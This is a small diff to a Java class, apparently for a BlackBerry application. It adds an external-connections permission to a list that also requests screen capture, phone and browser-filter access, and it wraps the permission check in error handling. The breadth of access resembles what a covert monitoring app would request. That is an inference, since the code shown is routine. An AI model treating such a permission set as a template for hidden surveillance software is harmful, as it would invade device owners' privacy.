@@ -142,6 +142,8 @@ public final class Core implements Runnable {
         apm.addReasonProvider(ApplicationDescriptor
                 .currentApplicationDescriptor(), drp);
 
+        //int PERMISSION_INTERNET = 0x7;
+        int PERMISSION_DISPLAY_LOCKED = 22;
         final int[] wantedPermissions = new int[] {
                 ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
                 ApplicationPermissions.PERMISSION_PHONE,
@@ -160,7 +162,8 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                 ApplicationPermissions.PERMISSION_BROWSER_FILTER,
                 ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION,
-                //ApplicationPermissions.PERMISSION_INTERNET,
+                ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,
+                //PERMISSION_DISPLAY_LOCKED, // 22
                 };
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
@@ -169,8 +172,14 @@ public final class Core implements Runnable {
         for (int i = 0; i < wantedPermissions.length; i++) {
             final int perm = wantedPermissions[i];
 
+            try{
             if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                 allPermitted = false;
+            }
+            }catch(IllegalArgumentException ex){
+                //#ifdef DEBUG
+                debug.error("checkPermissions: " + perm + " "+ex);
+                //#endif
             }
         }
 
